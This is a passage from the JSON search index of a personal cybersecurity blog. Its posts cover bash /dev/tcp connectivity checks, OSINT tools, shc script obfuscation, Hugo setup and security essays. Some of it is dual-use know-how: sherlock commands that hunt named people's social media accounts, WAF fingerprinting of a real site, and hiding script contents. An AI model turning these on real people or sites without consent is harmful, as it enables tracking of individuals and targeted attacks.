close\\r\\n\\r\\n\u0026#34; \u0026gt;\u0026amp;3 cat \u0026lt;\u0026amp;3 HTTP/1.1 200 OK Content-Type: text/html; charset=ISO-8859-1 Content-Security-Policy-Report-Only: object-src \u0026#39;none\u0026#39;;base-uri \u0026#39;self\u0026#39;;script-src \u0026#39;nonce-rfjZ0lOELcoZRvMge28doQ\u0026#39; \u0026#39;strict-dynamic\u0026#39; \u0026#39;report-sample\u0026#39; \u0026#39;unsafe-eval\u0026#39; \u0026#39;unsafe-inline\u0026#39; https: http:;report-uri https://csp.withgoogle.com/csp/gws/other-hp P3P: CP=\u0026#34;This is not a P3P policy! See g.co/p3phelp for more info.\u0026#34; Date: Thu, 04 May 2023 10:34:09 GMT Server: gws X-XSS-Protection: 0 X-Frame-Options: SAMEORIGIN Transfer-Encoding: chunked Expires: Thu, 04 May 2023 10:34:09 GMT Cache-Control: private Set-Cookie: 1P_JAR=2023-05-04-10; expires=Sat, 03-Jun-2023 10:34:09 GMT; path=/; domain=.google.com; Secure Set-Cookie: AEC=AUEFqZcECrlEggoQ15r5NcMZIwD0C5o3G5LFdqDWcgVEYwtsaAblLoxpQA4; expires=Tue, 31-Oct-2023 10:34:09 GMT; path=/; domain=.google.com; Secure; HttpOnly; SameSite=lax Set-Cookie: NID=511=h7zvs4z2hLAL2QkLxwVZys3AVoIoDi7LIEmuJNnRLwcKshharsm4yUVNjgJA48jhuwWJJCBV3llvMvXrDNoS-kyNt7uCZxjJfWsnBhS6Wi7KUPYxZKNWmt1KLAJs3Jnl4L0mxSYhrGpUmOJpxnyyzHGSSsCK6L43AY9Is4DBNa0; expires=Fri, 03-Nov-2023 10:34:09 GMT; path=/; domain=.google.com; HttpOnly Connection: close To check if Internet is connected # #!/bin/bash HOST=www.google.com PORT=80 (echo \u0026gt;/dev/tcp/${HOST}/${PORT}) \u0026amp;\u0026gt;/dev/null if [ $? -eq 0 ]; then echo \u0026#34;Connection to $HOST : 😄 successful\u0026#34; else echo \u0026#34;Connection to $HOST : 😟 unsuccessful\u0026#34; fi $ bash online_google.sh Connection to www.google.com : 😄 successful ","date":"2023-02-28 22:40","externalUrl":null,"permalink":"/posts/tcp_socket_in_bash/","section":"posts","summary":"Using /bin/bash to create TCP/UDP socket for troubleshooting","title":"Creating TCP/UDP Socket with /bin/bash","type":"posts"},{"content":"","date":"2023-02-26 18:16","externalUrl":null,"permalink":"/tags/framework/","section":"tags","summary":"","title":"framework","type":"tags"},{"content":" Open Source Intelligence (OSINT) is the collection, analysis, and dissemination of information that is publicly available and legally accessible. National OSINT Day # OSINT Day is celebrated on February 26th each year. It was established by the OSINT Foundation, a professional association of U.S. Intelligence Community open-source intelligence (OSINT) practitioners, in recognition of the contributions made to the national security of the United States by OSINT practitioners and the OSINT discipline.\nI didn\u0026rsquo;t know there is OSINT Day has been established until today.\nThus, with OSINT Day, it is an opportunity to raise awareness of the importance of OSINT and to celebrate the work of OSINT practitioners. It is also a time to learn more about OSINT techniques and tools, and to share knowledge with others.\nOSINT Tools # Here are the 3 common tools that I used for OSINT.\nWAFW00F: A WAF Fingerprinting Tool. SherLock: A tool to hunt down social media accounts by username. OSINT-Frameowrk: A OSINT framework that help to find free OSINT resources. WAF Fingerprinting # Web application firewall, or known as WAF, is a security device that protect websites from attacks.\nWAFW00f is a WAF fingerprinting tool. It is used to identify the specific type of WAF that is protecting a website.\nThis information can be useful for attackers, as it can help them to develop targeted attacks against the WAF. However, it can also be useful for security professionals, as it can help them to identify and mitigate vulnerabilities in WAFs.\n$ git clone https://github.com/EnableSecurity/wafw00f $ cd wafw00f $ sudo python setup.py install To start fingerprinting a website, like bbc.com, just do:\n$ wafw00f bbc.com ______ / \\ ( Woof! ) \\ ____/ ) ,, ) (_ .-. - _______ ( |__| ()``; |==|_______) .)|__| / (\u0026#39; /|\\ ( |__| ( / ) / | \\ . |__| \\(_)_)) / | \\ |__| ~ WAFW00F : v2.2.0 ~ The Web Application Firewall Fingerprinting Toolkit [*] Checking https://bbc.com [+] The site https://bbc.com is behind Cloudfront (Amazon) WAF. [~] Number of requests: 2 This is is created in Python by EnableSecurity and can be downloaded at:\nEnableSecurity/wafw00f WAFW00F allows one to identify and fingerprint Web Application Firewall (WAF) products protecting a website. Python 5507 951 Social Media # To hunt down a targetted user across social networks, we can use a tool called sherlock.\nSame as wafw00f, sherlock can run as container too.\n$ git clone https://github.com/sherlock-project/sherlock.git $ cd sherlock $ python3 -m pip install -r requirements.txt To start hunting a user, hackerman1337:\n$ python3 sherlock hackerman1337 To hunt for more users:\n$ python3 sherlock elonmusk billgates sherlock is hosting at:\nsherlock-project/sherlock Hunt down social media accounts by username across social networks Python 62395 7187 OSINT Framework # OSINT is the collection, analysis and dissemination of publicly accessible information using open source tools. And OSINT Framework is a tool focusing providing the free resources/tools for OSINT.\nThe tool is available at https://osintframework.com/, and the project is hosting at:\nlockfale/OSINT-Framework OSINT Framework JavaScript 8201 1376 Links # National OSINT Day. SANS What is Open-Source Intelligence? ","date":"2023-02-26 18:16","externalUrl":null,"permalink":"/posts/osint_day/","section":"posts","summary":"Hey, today is OSINT Day!","title":"OSINT Day","type":"posts"},{"content":"","date":"2023-02-26 18:16","externalUrl":null,"permalink":"/tags/social/","section":"tags","summary":"","title":"social","type":"tags"},{"content":"","date":"2023-02-26 18:16","externalUrl":null,"permalink":"/tags/waf/","section":"tags","summary":"","title":"waf","type":"tags"},{"content":" Hugo Config # When a link goes to an external website, I prefer to have them open in a new browser tab.\nTo accomplish this goal, I need to override the Hugo default behavior for rendering links, by creating a new file called \u0026lt;hugo\u0026gt;/layouts/_default/_markup/render-link.html.\nAnd copy-paste the following code into the render-link.html file.\n\u0026lt;a href=\u0026#34;{{ .Destination | safeURL }}\u0026#34;{{ with .Title}} title=\u0026#34;{{ . }}\u0026#34;{{ end }}{{ if or (strings.HasPrefix .Destination \u0026#34;http\u0026#34;) (strings.HasPrefix .Destination \u0026#34;https\u0026#34;) }} target=\u0026#34;_blank\u0026#34;{{ end }} \u0026gt;{{ .Text | safeHTML }}\u0026lt;/a\u0026gt; With this, any link with http or https, will now open in new tab for external link while within the website, it will open at the same tab. :smile:\n","date":"2023-02-22 19:43","externalUrl":null,"permalink":"/posts/new_tab_external_link/","section":"posts","summary":"Open external links in a New Tab in your browser.","title":"Open New Tab in Hugo","type":"posts"},{"content":" Python: rich # rich is a powerful tool for formatting and displaying text in Python. It can be used to make your code more readable and visually appealing, and it can also be used to create interactive and engaging applications.\nFeatures # The rich package has a wide range of features, including:\nText formating: to format text in variety of ways, including colors, bolding, and italics. Table display: to display tables of data in a clear and organized way. Markdown rendering: to render markdown documents, for rich and formatted test. Progress bars: to display progress bars, which can be helpful for tracking the progress of long-running tasks. Example: print_myself.py # Here\u0026rsquo;s a output of a Python script that will print itself.\n","date":"2023-01-23 19:09","externalUrl":null,"permalink":"/posts/python_rich/","section":"posts","summary":"Enrich python cmdline apps with RICH.","title":"Python Rich Package","type":"posts"},{"content":"","date":"2023-01-04 19:07","externalUrl":null,"permalink":"/tags/crypto/","section":"tags","summary":"","title":"crypto","type":"tags"},{"content":"In this tutorial, let\u0026rsquo;s see how to encrypt our shell script with an opensource tool called shc. But, personally, I won\u0026rsquo;t call shc a security tool. It is just an obfuscation tool.\nWhat is shc? # shc is called a \u0026ldquo;generic script compiler\u0026rdquo;. It takes a shell script, convert it to C source code, and compile it as binary executable.\nshc is not a compiler. It rather encodes and encrypts a shell script , and generate C source code. It also has an additioanal capability to apply expiration date while generating the C source code. It also strips the binary after compilation. Upon execution, the compiled+encrypted binary will first decrypt and execute the code with the shell -c option.\nInstallation # We can install shc directly, or we can build it from source.\n$ sudo apt install shc To build from the soruce:\n$ git clone https://github.com/neurobin/shc.git $ cd shc $ ./cofngiure $ make $ sudo make install Usage # For example, we would like to encrypt a shell scipt called check_online.sh.\n$ shc -v -f check_online.sh shc shll=bash shc [-i]=-c shc [-x]=exec \u0026#39;%s\u0026#39; \u0026#34;$@\u0026#34; shc [-l]= shc opts= shc: cc check_online.sh.x.c -o check_online.sh.x shc: strip check_online.sh.x shc: chmod ug=rwx,o=rx check_online.sh.x $ $ file check_online.sh.x check_online.sh.x: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=377c5f8b2d1cd55f759bf613fef92824d2b4ab3a, for GNU/Linux 3.2.0, stripped $ To add expiration date to the script:\n$ shc -v -e 01/01/2023 -m \u0026#34;Contact author to use this script\u0026#34; -f check_online.sh shc -e Sun Jan 1 00:00:00 2023 shc -e Sun Jan 1 00:00:00 2023 shc shll=bash shc [-i]=-c shc [-x]=exec \u0026#39;%s\u0026#39; \u0026#34;$@\u0026#34; shc [-l]= shc opts= shc: cc check_online.sh.x.c -o check_online.sh.x shc: strip check_online.sh.x shc: chmod ug=rwx,o=rx check_online.sh.x $ ./check_online.sh.x yahoo.com ./check_online.sh.x: has expired! Contact author to use this script Troubleshoot # In case you see the \u0026ldquo;shc: invalid first line in script\u0026rdquo; error, it means the original shell script has a missing \u0026ldquo;shebang\u0026rdquo;, like #!/bin/bash or #!/bin/sh.\nLinks # Shell Script Compiler ","date":"2023-01-04 19:07","externalUrl":null,"permalink":"/posts/encrypt_shell_script/","section":"posts","summary":"We can encrypt our BASH shell script to protect some confidential configuration.","title":"Encrypted Shell Script","type":"posts"},{"content":"","date":"2023-01-01 19:25","externalUrl":null,"permalink":"/tags/blog/","section":"tags","summary":"","title":"blog","type":"tags"},{"content":"First post in 2023.\nMySeq has a new blog at GitHub Pages starting in 2023. You can still find the old blog at MySeq Blogspot.\nMoving forward, I\u0026rsquo;ll put all new posts here, with some articles and technical write ups to this site. I\u0026rsquo;ll slowly move some of my old and unpublished articles, to this site manually.\n","date":"2023-01-01 19:25","externalUrl":null,"permalink":"/posts/new_blog/","section":"posts","summary":"MySeq new blog","title":"New MySeq Blog at GitHub","type":"posts"},{"content":" Cybersecurity specialists thinks 24 hours, and database engineer thinks end of every quarter. ","date":"2022-12-24 21:47","externalUrl":null,"permalink":"/posts/cybersecurity_vs_database_engineering/","section":"posts","summary":"What is the difference between Cybersecurity and Database engineering?","title":"Cybersecurity vs Database Engineering","type":"posts"},{"content":" Security Intelligence # Base64 # Base64 Decoder Base64 Encoder Network Intelligence # DNS recon with DNSdumpster. SSL/TLS # Scan SSL/TLS client at How\u0026rsquo;s My SSL. Scan domain with TLS checker. Web Scan # Web scan with URLscan. Security Headers by Probely. Observatory by Mozilla: HTTP, TLS, SSH. tls-observatory http-observatory (Deprecated) ssh_scan Others # Generative AI # Gemini by Google. chatGPT by OpenAI. chatGPT Playground Claude.AI by Anthropic. POE by Quora. Images # Get royalty free images at Pexels. Icons and stikers customization at FlatIcon Diagram # https://www.drawio.com/ : Draw.io Markdown # Emoji markup list gistfile1.md GitHub Emoji Picker Graphemica Fuck Yeah Markdown Performance # Use the online version PageSpeed Insights. Discover tools and information to build high-performance websites with Google Speed. Use browser\u0026rsquo;s built-in lighthouse to test page performance. ","date":"2022-12-21 21:38","externalUrl":null,"permalink":"/online/","section":"MySeq","summary":"Handy online tools.","title":"🔧 Online tools 🔨","type":"page"},{"content":"","date":"2022-12-21 21:38","externalUrl":null,"permalink":"/tags/learn/","section":"tags","summary":"","title":"learn","type":"tags"},{"content":"","date":"2022-12-21 21:38","externalUrl":null,"permalink":"/tags/links/","section":"tags","summary":"","title":"links","type":"tags"},{"content":" Funs # About:about [ Browser ] Edge surfing [ strictly for MS Edge browser only ] Fire starts here [ strictly for Firefox browser only ] Games # PacMan :ghost: 👻 LoadRunner :runner: 🏃 Learning # w3schools.com geeksforgeeks.org Personal # YouTube Subscription. Saved playables at YouTube. NotebookLM Online # https://www.drawio.com/ : Draw.io Google Admin Toolbox ","date":"2022-12-21 21:38","externalUrl":null,"permalink":"/links/","section":"MySeq","summary":"Have fun via links and learning.","title":"Links","type":"page"},{"content":"","date":"2022-12-21 21:38","externalUrl":null,"permalink":"/tags/website/","section":"tags","summary":"","title":"website","type":"tags"},{"content":" MySeq: Essential security, simplified. All contents, blog posts, and opinions are on my own.\nAbout # MySeq was created to break down complex cybersecurity concepts into manageable steps, making essential security accessible to all.\nIt is also a personal website that sharing my thought on practicing essential security and simplify Cybersecurity. Nonetheless, I also share some programming techniques, mostly tutorials and articles, and a range of topics including Linux 🐧, open source, Python 🐛, docker , Kubernetes, virtualization and software development .\nThis site is powered by Hugo 🧙 , a static site generator, with Blowfish 🐡 theme. It is hosting at GitHub Pages.\nBefore this, MySeq was hosting in Blogger.com at https://myseq.blogspot.com/.\nAll the pages/posts are edited with vi editor and tested with firefox browser. 😊\n/** MySeq Config **/ // JSON format { \u0026#34;Site\u0026#34;: \u0026#34;MySeq\u0026#34;, \u0026#34;BaseURL\u0026#34;: \u0026#34;https://myseq.github.io\u0026#34;, \u0026#34;Author\u0026#34;: \u0026#34;zd\u0026#34;, \u0026#34;Config\u0026#34;: [ { \u0026#34;Font\u0026#34;: \u0026#34;Fira Code\u0026#34;, \u0026#34;Link\u0026#34;: \u0026#34;https://fonts.google.com/specimen/Fira+Code\u0026#34; }, { \u0026#34;Theme\u0026#34;: \u0026#34;Blowfish\u0026#34;, \u0026#34;Emojicon\u0026#34;: \u0026#34;🐡\u0026#34;, \u0026#34;ColorScheme\u0026#34;: \u0026#34;avocado\u0026#34;, \u0026#34;ColorEmojicon\u0026#34;: \u0026#34;🥑\u0026#34; } ] } See Font Used by MySeq for why Fira Code is selected.\nHistory # 2023-10 myseq.github.io Hugo Theme: Blowfish 2023-01 myseq.github.io Hugo Theme: Terminal 2015-06 myseq.github.io Jekyll Theme: Jekyll-now 2004-09 myseq.blogspot.com Blogger Theme: custom Links # MySeq\u0026rsquo;s SSH public key. MySeq at GitHub. myseq/myseq ✨ myseq@github ✨ repository. All codes, contents, blog posts, and opinions are on my own. 🦖 Markdown 0 0 Hugo Static Site Generator. Hugo Hosts on GitHub Configure Hugo Hugo\u0026rsquo;s Security Model 🔐 Site Variables ","date":"2022-12-21 21:38","externalUrl":null,"permalink":"/about/","section":"MySeq","summary":"\u003ccode\u003eMySeq\u003c/code\u003e = essential_security + simplify_cybersecurity","title":"🧙 About Myseq 🥑 ","type":"page"},{"content":"[root@localhost ~]# finger myseq Login: myseq Name: myseq Directory: /home/myseq Shell: /usr/bin/zsh Last login Wed Jan 15 20:14 on tty1 from home. No mail. No Plan. [root@localhost ~]# ","date":"2022-12-14 20:13","externalUrl":null,"permalink":"/plan/","section":"MySeq","summary":"$ cat ~/.plan","title":"~/.plan","type":"page"},{"content":"","date":"2022-12-14 20:13","externalUrl":null,"permalink":"/tags/plan/","section":"tags","summary":"","title":"plan","type":"tags"},{"content":" Project Description Status Lab21 A series of tutorials for learning different technologies 2021 ~ 太極拳文獻 Documentation created using MkDocs Done (2024.11) 3D Printing 3d Printing project with MakerPI Done (2021) Drone DJI Mavic Mini 1 Done (2020) RPi Raspberry Pi (RPi) Projects - all my work on RPi + PiBang Done (2019) WEP Crackinig RPi + Alpha USB WiFi adapteri Done (2013) RPi + Pi Camera 1) Motion Detection \u0026amp; time lapse video.\n2) Video streaming Done (2012) ","date":"2022-12-13 20:13","externalUrl":null,"permalink":"/projects/","section":"MySeq","summary":"$ cat ~/.projects","title":"~/.projects","type":"page"},{"content":"","date":"2022-12-13 20:13","externalUrl":null,"permalink":"/tags/projects/","section":"tags","summary":"","title":"projects","type":"tags"},{"content":"#!/usr/bin/evn python3 # -*- coding: utf-8 -*- import asyncio import httpx import requests Requests vs HTTPX # In general, both the module are similar, Here, I just make a simple comparison on what are the differences between Python HTTPX and Requests module.\nRequests HTTPX Sessions requests.Session() httpx.Client() Async support not supported httpx.AsyncClient() HTTP/2 support not supported httpx.Client(http2=True) httpx.AsyncClient(http2=True) Links # Python HTTPX Python Requests Introduction to HTTP/2 ","date":"2022-12-11 22:43","externalUrl":null,"permalink":"/posts/httpx_vs_requests/","section":"posts","summary":"Quick comparison between httpx and requests.","title":"Python-httpx Vs Python-requests","type":"posts"},{"content":" 2022.12.10 - Install Hugo # To install Hugo:\n$ sudo apt update $ sudo apt upgrade -y $ sudo apt install hugo 2022.12.11 - Setup Hugo # To setup blog site with Hugo locally:\n$ mkdir -p source/github $ cd source/github $ git clone https://github.com/\u0026lt;user\u0026gt;/\u0026lt;user\u0026gt;.github.io.git $ cd \u0026lt;user\u0026gt;.github.io $ git checkout -b setup-hugo Switched to a new branch \u0026#39;setup-hugo\u0026#39; $ $ hugo new site --force . $ git clone https://github.com/panr/hugo-theme-terminal.git themes/terminal $ vi config.toml \u0026lt;hugo_home\u0026gt;/config.toml:\ntheme = \u0026#39;terminal\u0026#39; baseURL = \u0026#39;/\u0026#39; enableEmoji = true For the rest of the setup, please refer to hugo-theme-terminal\nTo start the Hugo server:\n$ hugo server -t terminal --bind=0.0.0.0 To push blog to GitHub:\n$ git add . $ git status $ git commit -m \u0026#34;setup 1 of blog site\u0026#34; $ git push origin setup-hugo $ $ git checkout main $ git pull $ To automating website deployment with CD process, and the please refer cd.yml to 04-continous-deployment:\n$ git checkout -b add-cd Switched to a new branch \u0026#39;add-cd\u0026#39; $ $ mkdir -p .github/workflows $ touch .github/workflows/cd.yml $ vi .github/workflows/cd.yml $ $ $ git add .github/workflows/cd.yml $ git commit -m \u0026#34;Add a GitHub Actions workflow to build and deploy the site\u0026#34; $ git push origin add-cd $ git checkout main Switched to branch \u0026#39;main\u0026#39; Your branch is up to date with \u0026#39;origin/main\u0026#39;. $ git pull $ Setup GH-Pages # Before pushing to GitHub, below is the additional setup for SSH logiin to GH. See Set up GitHub push with SSH keys.md\n$ git remote set-url origin git@github.com:username/your-repository.git In case of CD process fails, add extended: true next to hugo-version: 'latest'\nIn case of action-gh-pages fails, such as Action failed with \u0026ldquo;The process \u0026lsquo;/usr/bin/git\u0026rsquo; failed with exit code 128\u0026rdquo;\nchange settings under Settings-Action-General Workflow Permissions: Read and Write Allow GitHub Actions to approve pull requests 2022.12.12 - Configure Hugo # To check out a new branch to add content:\n$ git checkout -b adding-content $ For example, to create site content inside content directory:\n$ hugo new posts/\u0026lt;title\u0026gt;.md $ $ vim content/posts/\u0026lt;title\u0026gt;.md $ To push to GitHub and merging to main\n$ git add . $ git commit -m \u0026#34;yyyy.mm.dd - adding new post\u0026#34; $ git push origin adding-content $ $ git checkout main $ git pull $ 2023.04.30 - Reference # Here is a reference to tutorial on blogging with Hugo and GitHub Pages.\nBlogging with Hugo and GitHub Pages Create and Setup your blog repository on GitHub Locally setting up our blog site with Hugo Push our Hugo site to GitHub Automating Website Deployment Generating Blog Content Closing Remarks Hugo Hosts on GitHub Start Configure Hugo 2023.07.19 - Upgrade # I decided to upgrade the Hugo with Package Managers (snap) in order to stay with latest version (easier).\nSee the instruction at Linux Installation Quick start Host on GitHub Pages 2023.10.05 - Update # Check if \u0026ldquo;Read and write permissions\u0026rdquo; are enabled in Settings -\u0026gt; Actions -\u0026gt; General -\u0026gt; Workflow permissions: Make sure it is \u0026ldquo;Read and write permission\u0026rdquo; Check the option \u0026ldquo;Allow GitHub Actions to create and approve pull requests\u0026rdquo; ","date":"2022-12-10 07:02","externalUrl":null,"permalink":"/posts/hugo/","section":"posts","summary":"Install, setup, configure Hugo.","title":"Hugo","type":"posts"},{"content":" When a measure becomes a target, it ceases to be a good measure. ","date":"2022-11-22 21:19","externalUrl":null,"permalink":"/posts/goodhart_law/","section":"posts","summary":"When a measure becomes a target, it ceases to be a good measure.","title":"Goodhart's Law","type":"posts"},{"content":"","date":"2022-11-07 23:10","externalUrl":null,"permalink":"/tags/weather/","section":"tags","summary":"","title":"weather","type":"tags"},{"content":" curl # Check or curl your weather at cmdline with:\n$ curl -s wttr.in/Melbourne?format=\u0026#34;%l:%c+%C+%t/%f+%h+%w+%m+UV:%u/12+%P\u0026#34; Melbourne:⛅️ Partly cloudy +15°C/+14°C 59% ↑31km/h 🌗 UV:3/12 1016hPa $ $ curl -s wttr.in/New+York?format=\u0026#34;%l:%c+%C+%t/%f+%h+%w+%m+UV:%u/12+%P\u0026#34; New+York:☀️ Clear +1°C/-3°C 56% ↓15km/h 🌗 UV:1/12 1022hPa $ PowerShell # PS\u0026gt; Invoke-RestMEthod \u0026#39;https://wttr.in/New+York?format=\u0026#34;%l:%c+%C+%t/%f+%h+%w+%m+UV:%u/12+%P\u0026#34;\u0026#39; New+York:☀️ Clear +1°C/-3°C 56% ↓15km/h 🌗 UV:1/12 1022hPa PS\u0026gt; ","date":"2022-11-07 23:10","externalUrl":null,"permalink":"/posts/cmdline_weather/","section":"posts","summary":"Curl weather at the cmdline.","title":"Weather at Cmdline","type":"posts"},{"content":"","date":"2022-10-26 22:11","externalUrl":null,"permalink":"/tags/devops/","section":"tags","summary":"","title":"devops","type":"tags"},{"content":"After the post on Operation Hates Agile, here comes to the next, how to move from Operations to GitOps.\nMoving to GitOps # Infrastructure-as-Code, or IaC, is replacing the traditional operation. It allows enterprise to control changes and manage the configuration settings in cloud environment more efficiently.\nFirst, we need to know what contained inside IaC. There are 3 characteristics in IaC:\nImperative and Declarative Mutable and Immutable DevOps Imperative Vs. Declarative # When working with Infrastructure as Code (IaC), we can use two different approaches to make changes to cloud environments: declarative and imperative automation.\nImperative automation involves using a command line interface (CLI) to create a script that specifies the changes to be made in a container, virtual machine, or virtual private cloud. However, this process can be time-consuming if changes need to be made to multiple VM.\nDeclarative automation, on the other hand, involves simply stating your desired infrastructure state, such as a VM with a domain attached, and letting the automation tools take care of the configuration process. This approach is often easier to communicate and streamlines the process of configuring infrastructure.\nMutable Vs. Immutable # Infrastructure can be categorized into two types: mutable and immutable.\nMutable infrastructure, like a virtual machine, can be changed after it\u0026rsquo;s deployed. On the other hand, immutable infrastructure, like a container, cannot be changed once it\u0026rsquo;s deployed. Changes are made to the original image and declarative statements, ensuring consistent changes across like devices.\nHowever, when we use both imperative and declarative automation methods interchangeably to manage IaC, it can lead to a problem called Configuration Drift. Configuration Drift occurs when mutable infrastructure is changed, causing it to become out of sync with the rest of the infrastructure.\nTo maintain security, it\u0026rsquo;s important to have consistent application of configurations across the infrastructure. This is because even one small opening can give hackers a way in. Consistency complicates matters for the hacker, making it more difficult to exploit vulnerabilities in the infrastructure.\nDevOps Practices (GitOps) # For smoother and quicker deployment of network and virtual machine configurations, it\u0026rsquo;s important to use a controlled system. Developers can then request containers or virtual machines through an automated request, ensuring the same level of stability as code. This leads to better versioning that\u0026rsquo;s easier to trace.\nThis approach is called GitOps, and it enables us to provision infrastructure with full automation and version control, similar to DevOps.\nThe world is changing so fast. Big will not beat small anymore. It will be the fast beating the slow.\n","date":"2022-10-26 22:11","externalUrl":null,"permalink":"/posts/infrastructure_as_code/","section":"posts","summary":"How to move from Operations to GitOps?","title":"Infrastructure-as-Code (IaC)","type":"posts"},{"content":" Agile (DevOps) and Operations # Agile development methodologies are known for moving quickly and continuously improving, which can make it challenging for operations teams to maintain stable and predictable metrics. Similarly, audit teams may struggle to keep up with the pace of DevOps, leading to delayed reports and outdated information.\nIt is known that most audit team is like operation teams which hate Agile. 😜 Very often by the time audit team finish the report, DevOps is already making 38 changes. 😅\nDespite these challenges, some organizations believe that Agile can replace traditional operations, change management, and audit practices. However, this requires buy-in from top management, who must be willing to replace traditional practices with Agile methodologies.\nTo successfully implement Agile in your company, it may be helpful to follow these rules:\nStop all approval flows at all management levels. Replace current metrics with Agile tracking. Operation Challenges with Agile # Agile can be suitable for cyber operations if it is implemented properly and aligned with the organization\u0026rsquo;s goals and roadmap, such as :\nFaster response to cyber threats and incidents Continuous improvement and feedback Better collaborationand communication among teams Promote automation for testing and scanning However, agile does come with some challenges too, such as:\nChanging the culature and mindset of security teams and stakeholders Balancing speed and quality of security solutions Dealing with regulatory and compliance requirements Especially, in cyber security operations, there is always black swan event happens. And when it happens, the automation will fail. We can\u0026rsquo;t simply automate what we haven\u0026rsquo;t seen before.\nTo manage the black swan event, cyber ops team should implement orchestration. Orchestration is simply managing multiple automated tasks to create a dynamic workflow or transform a process end-to-end12. Orchestration can be considered a form of \u0026ldquo;automating automation\u0026rdquo;\n","date":"2022-10-19 23:19","externalUrl":null,"permalink":"/posts/agile_vs_operations/","section":"posts","summary":"Does operation hate Agile?","title":"Agile vs Operations","type":"posts"},{"content":" Detection outcomes or classification outcomes, come from the field of binary classification.\nThere are applied in vulnerability management to describe how accurately a vulnerability scanning tool or process identifies issues.\nFor example, if a vulnerability scanner identifies a specific security flaw (such as an outdated software version with known exploits), and this flaw actually exists on the system, that’s a true positive. It indicates the detection was accurate and actionable.\n4 Outcomes # Outcomes Definition Vuln Exists Vuln Not_Found True Positive Correctly identifies a vulnerability that exists. ✔️ False Positive Incorrectly identifies a vulnerability that doesn\u0026rsquo;t exist. ✔️ True Negative Correctly identifies that a vulnerability doesn\u0026rsquo;t exist. ✔️ False Negative Incorrectly fails to identify a vulnerability that exists. ✔️ In machine learning and cybersecurity, these outcomes are sometimes also referred to as the confusion matrix outcomes, as they are part of the confusion matrix used to evaluate the performance of a classifier.\n","date":"2022-09-03 11:49","externalUrl":null,"permalink":"/posts/vuln_detection/","section":"posts","summary":"4 outcomes in vulnerability detection.","title":"Vulnerability Detection Outcomes","type":"posts"},{"content":"","date":"2022-09-01 12:00","externalUrl":null,"permalink":"/tags/architecture/","section":"tags","summary":"","title":"architecture","type":"tags"},{"content":" A simple network architecture design based on layered approach. Architecture # Here\u0026rsquo;s a typical layered achitecture design, with DMZ and Backend networks, and connected via firewalls.\n%%{init: {'theme': 'forest'}}%% flowchart TD %% Nodes Internet(\"fa:fa-globe Internet\") Firewall1(\"fa:fa-shield Firewall\") DMZ[\"DMZ Network\"] Firewall2(\"fa:fa-shield Firewall\") Backend[\"Backend Network\"] DNS(\"fa:fa-server DNS Server\") Web(\"fa:fa-server WEB Server\") AppServer(\"fa:fa-server App Server\") Database(\"fa:fa-database Database\") %% Grouping nodes in Subgraphs subgraph DMZ DNS Web end subgraph Backend AppServer Database end %% Edge connections between nodes Internet --\u003e Firewall1 --\u003e DMZ DMZ --\u003e Firewall2 --\u003e Backend Network Diagram # This is a network diagram that based on the architecture above.\n%%{init: {'theme': 'forest'}}%% graph TB External(\"fa:fa-globe Internet/cloud\") FW{{\"fa:fa-shield Enterprise FW\"}} subgraph Backend [DC Backend] direction LR AppSvr((\"fa:fa-server App Server\")) DBSvr1[(\"fa:fa-database Database\")] DBSvr2[(\"fa:fa-database Database\")] DBSvr1 ~~~ AppSvr ~~~ DBSvr2 end subgraph office direction TB ITOPS(\"fa:fa-user IT Ops\") Users(\"fa:fa-users Users\") Users ~~~ ITOPS end subgraph DMZ direction TB DNS(\"fa:fa-server DNS_Server\") WEB(\"fa:fa-server WEB_Server\") DNS ~~~ WEB end subgraph DC [Data Center] direction LR FW \u003c---\u003e DMZ office ---\u003e FW end External \u003c---\u003e DC \u003c---\u003e Backend Both diagrams are created with mermaid.js.\nLinks # Mermaid Docs ","date":"2022-09-01 12:00","externalUrl":null,"permalink":"/posts/network_diagram/","section":"posts","summary":"A simple network diagram.","title":"Basic Network Architecture","type":"posts"},{"content":"","date":"2022-09-01 12:00","externalUrl":null,"permalink":"/tags/network/","section":"tags","summary":"","title":"network","type":"tags"},{"content":" Don\u0026rsquo;t push your most loyal people to the point that they no longer care.\nBecause if you do, you run the risk of pushing away great talent while settling for mediocrity.\n","date":"2022-08-09 21:50","externalUrl":null,"permalink":"/posts/leadership_first/","section":"posts","summary":"Dont\u0026rsquo;s push your most loyal people to the point \u0026hellip;","title":"Leadership First","type":"posts"},{"content":" 418. I\u0026rsquo;m a teapot.\nThe requested entity body is short and stout.\nTip me over and pour me out.\nAbout: 🫖 Google: Error 418 🫖 Mozilla: 418 I'm a teapot 🫖 Wikipedia: Hyper Text Coffee Pot Control Protocol 🫖 Save418: The Save 418 Movement 🫖 IETF: RFC 2324 #section-2.3.2 $ curl -i https://httpbin.org/status/418 HTTP/2 418 date: Tue, 18 Apr 2023 12:10:40 GMT content-length: 135 server: gunicorn/19.9.0 x-more-info: http://tools.ietf.org/html/rfc2324 access-control-allow-origin: * access-control-allow-credentials: true -=[ teapot ]=- _...._ .\u0026#39; _ _ `. | .\u0026#34;` ^ `\u0026#34;. _, \\_;`\u0026#34;---\u0026#34;`|// | ;/ \\_ _/ `\u0026#34;\u0026#34;\u0026#34;` ","date":"2022-08-05 17:01","externalUrl":null,"permalink":"/teapot/","section":"MySeq","summary":"HTTP Status 418 \u0026hellip;","title":"Error 418: I'm a teapot 🫖","type":"page"},{"content":"","date":"2022-07-31 16:42","externalUrl":null,"permalink":"/tags/immutable/","section":"tags","summary":"","title":"immutable","type":"tags"},{"content":"","date":"2022-07-31 16:42","externalUrl":null,"permalink":"/tags/laws/","section":"tags","summary":"","title":"laws","type":"tags"},{"content":" Immutable Laws of Security # The 10 Immutable Laws of Security was first published by the Microsoft TechNet in 2000.\nAt that time, there is a screen saver releasedi (in 2001) for it:\nLaw #1: If a bad guy can persuade you to run his program on your computer, it’s not your computer anymore Law #2: If a bad guy can alter the operating system on your computer, it’s not your computer anymore Law #3: If a bad guy has unrestricted physical access to your computer, it’s not your computer anymore Law #4: If you allow a bad guy to upload programs to your website, it’s not your website any more Law #5: Weak passwords trump strong security Law #6: A computer is only as secure as the administrator is trustworthy Law #7: Encrypted data is only as secure as the decryption key Law #8: An out of date virus scanner is only marginally better than no virus scanner at all Law #9: Absolute anonymity isn’t practical, in real life or on the Web Law #10: Technology is not a panacea Below is the version 2.0 (released in Aug 2, 2017) and it is maintained by Microsoft Security Response Center:\nLaw #1: If a bad actor can persuade you to run their program on your computer, it\u0026rsquo;s not solely your computer anymore. Law #2: If a bad actor can alter the operating system on your computer, 